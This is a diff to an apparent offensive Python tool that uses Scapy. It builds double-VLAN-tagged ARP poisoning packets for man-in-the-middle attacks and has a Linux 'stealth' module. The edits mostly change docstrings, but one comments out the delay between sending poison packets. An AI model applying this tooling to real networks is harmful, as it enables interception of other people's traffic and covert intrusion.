@@ -35,7 +35,7 @@ class StealthModule:
 		"""Checks if running in Linux then start stealthing
 		
 		Returns:
-		    TYPE: Description
+		    int: Finish Code
 		
 		Raises:
 		    e: Description
@@ -47,7 +47,7 @@ class StealthModule:
 
 		if platform.system() != "Linux":
 			raise Exception("This stealth function only works only on Linux OS")
-			return 
+			return -1
 
 
 		try:
@@ -243,14 +243,14 @@ class Poisoner:
 
 			
 	def double_tag_poison_packets(self, target_mac, gateway_mac):
-		"""Summary
+		""" Join Ether, Dot1Q with ARP for Poison Packets
 		"""
 		self.PKT_poison_1  = Ether(dst=target_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_1
 
 		self.PKT_poison_2 = Ether(dst=gateway_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_2
 
 	def double_tag_unpoison_packets(self, target_mac, gateway_mac):
-		"""Summary
+		""" Join Ether, Dot1Q with ARP for Unpoison Packets 
 		"""
 		self.PKT_unpoison_1 = Ether(dst=target_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_1
 
@@ -308,7 +308,7 @@ class Poisoner:
 				send(self.PKT_poison_2, verbose=False)
 
 				# Abide to RFC
-				time.sleep(self.ARP_SEND_DELAY)
+				# time.sleep(self.ARP_SEND_DELAY)
 			
 		except KeyboardInterrupt:
 			# Unpoison if Ctrl-C 
@@ -438,12 +438,6 @@ class ArgParser(argparse.ArgumentParser):
 		if arg_obj.vlan1_num is  None and arg_obj.vlan2_num is not  None:
 			error_msg += "[--vlan1] Please specified vlan1 number\n"
 
-		# if arg_obj.vlan1_num is not None and arg_obj.vlan2_num is not None:
-		# 	if not self.IS_VALID_VLAN_NO(arg_obj.vlan1_num):
-		# 		error_msg += "[--vlan1] Invalid VLAN Tag 1\n"
-
-		# 	if not self.IS_VALID_VLAN_NO(arg_obj.vlan2_num):
-		# 		error_msg += "[--vlan2] Invalid VLAN Tag 2\n"
 		return error_msg
 
 
